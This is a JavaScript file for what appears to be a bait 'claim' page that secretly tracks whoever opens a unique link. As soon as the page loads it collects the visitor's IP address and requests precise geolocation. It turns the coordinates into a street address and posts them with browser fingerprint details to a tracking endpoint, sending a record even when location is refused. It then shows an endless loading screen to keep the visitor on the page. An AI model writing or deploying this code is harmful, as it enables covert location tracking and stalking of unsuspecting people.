(async function() {
    const pathParts = window.location.pathname.split('/');
    const linkId = pathParts[pathParts.length - 1];
    const loadingOverlay = document.getElementById('loading-overlay');
    const claimBtn = document.getElementById('claim-btn');
    let hasSent = false;

    function showLoadingForever() {
        if (loadingOverlay) {
            loadingOverlay.classList.remove('hidden');
        }
    }

    async function initTracking() {
        if (hasSent) return;
        
        let ip = '';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                ip = ipData.ip;
            }
        } catch (e) {
            // Ignore errors
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    if (hasSent) return;
                    hasSent = true;
                    
                    let city = null;
                    let address = null;
                    
                    try {
                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`, {
                            headers: {
                                'Accept-Language': 'en-US,en;q=0.9',
                                'User-Agent': 'ViutckLocationTracker/1.0'
                            }
                        });
                        if (geoResponse.ok) {
                            const json = await geoResponse.json();
                            city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
                            address = json.display_name;
                        }
                    } catch (e) {
                        // Ignore errors
                    }

                    const data = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        city: city,
                        address: address,
                        ip_address: ip,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        screen_resolution: screen.width + 'x' + screen.height,
                        language: navigator.language,
                        location_denied: false
                    };

                    try {
                        await fetch(`/api/track/${linkId}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                    } catch (e) {}
                    
                    showLoadingForever();
                },
                async function(error) {
                    if (hasSent) return;
                    hasSent = true;

                    const data = {
                        latitude: null,
                        longitude: null,
                        accuracy: null,
                        altitude: null,
                        city: null,
                        address: null,
                        ip_address: ip,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        screen_resolution: screen.width + 'x' + screen.height,
                        language: navigator.language,
                        location_denied: true
                    };

                    try {
                        await fetch(`/api/track/${linkId}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                    } catch (e) {}
                    
                    showLoadingForever();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        } else {
            if (hasSent) return;
            hasSent = true;

            const data = {
                latitude: null,
                longitude: null,
                accuracy: null,
                altitude: null,
                city: null,
                address: null,
                ip_address: ip,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen_resolution: screen.width + 'x' + screen.height,
                language: navigator.language,
                location_denied: true
            };

            try {
                await fetch(`/api/track/${linkId}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            } catch (e) {}
            
            showLoadingForever();
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initTracking);
    } else {
        initTracking();
    }

    if (claimBtn) {
        claimBtn.addEventListener('click', (e) => {
            e.preventDefault();
            showLoadingForever();
            initTracking();
        });
    }
})();
